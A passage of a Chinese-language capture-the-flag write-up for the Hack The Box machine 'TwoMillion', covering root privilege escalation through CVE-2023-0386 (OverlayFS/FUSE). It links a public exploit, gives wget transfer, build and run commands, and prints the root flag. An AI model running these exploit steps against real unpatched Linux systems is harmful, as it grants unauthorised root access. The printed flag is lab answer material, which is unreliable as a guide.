+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">From:</span> ch4p &lt;ch4p@<span class="hljs-number">2</span>million.htb&gt;<br><span class="hljs-symbol">To:</span> admin &lt;admin@<span class="hljs-number">2</span>million.htb&gt;<br><span class="hljs-symbol">Cc:</span> g0blin &lt;g0blin@<span class="hljs-number">2</span>million.htb&gt;<br><span class="hljs-symbol">Subject:</span> Urgent: Patch System OS<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">1</span> June <span class="hljs-number">2023</span> <span class="hljs-number">10</span>:<span class="hljs-number">45</span>:<span class="hljs-number">22</span> -<span class="hljs-number">0700</span><br>Message-ID: &lt;<span class="hljs-number">9876543210</span>@<span class="hljs-number">2</span>million.htb&gt;<br>X-Mailer: ThunderMail Pro <span class="hljs-number">5.2</span><br><br>Hey admin,<br><br>I<span class="hljs-comment">&#x27;m know you&#x27;re working as fast as you can to do the DB migration. While we&#x27;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#x27;t get popped by that.</span><br><br>HTB Godfather<br></code></pre></td></tr></table></figure>
+
+<p>提到了 OverlayFS &#x2F; FUSE，可以搜到存在权限提升漏洞</p>
+<p>EXP：<a target="_blank" rel="noopener" href="https://github.com/xkaneiki/CVE-2023-0386">https://github.com/xkaneiki/CVE-2023-0386</a></p>
+<p>先下载到kali里</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224205805333.png" srcset="/img/loading.gif" lazyload alt="image-20251224205805333"></p>
+<p>然后起个服务，利用<code>wget</code>命令传到靶机上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0:80<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224205858031.png" srcset="/img/loading.gif" lazyload alt="image-20251224205858031"></p>
+<p>在靶机上下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.16.65/CVE-2023-0386.zip<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224210021542.png" srcset="/img/loading.gif" lazyload alt="image-20251224210021542"></p>
+<p>然后解压，并进入目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip CVE-2023-0386.zip<br></code></pre></td></tr></table></figure>
+
+<p>按照EXP的教程做</p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224210131295.png" srcset="/img/loading.gif" lazyload alt="image-20251224210131295"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make all<br>./fuse ./ovlcap/lower ./gc<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224210145140.png" srcset="/img/loading.gif" lazyload alt="image-20251224210145140"></p>
+<p><img src="/2025/12/24/TwoMillion/image-20251224210224123.png" srcset="/img/loading.gif" lazyload alt="image-20251224210224123"></p>
+<p>然后再弹shell，开一个终端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./exp<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224210310154.png" srcset="/img/loading.gif" lazyload alt="image-20251224210310154"></p>
+<p>就成功提权了，最后读root里的flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/24/TwoMillion/image-20251224210353444.png" srcset="/img/loading.gif" lazyload alt="image-20251224210353444"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">11</span>d<span class="hljs-number">68</span>fa<span class="hljs-number">040</span>b<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">11</span>fbe<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">771084728717</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TwoMillion</div>
+      <div>https://yschen20.github.io/2025/12/24/TwoMillion/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Suzen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/23/Cap/" title="Cap">
+                        <span class="hidden-mobile">Cap</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("04/25/2025 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="https://static.kevinchu.top/blog/assets/js/stars.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
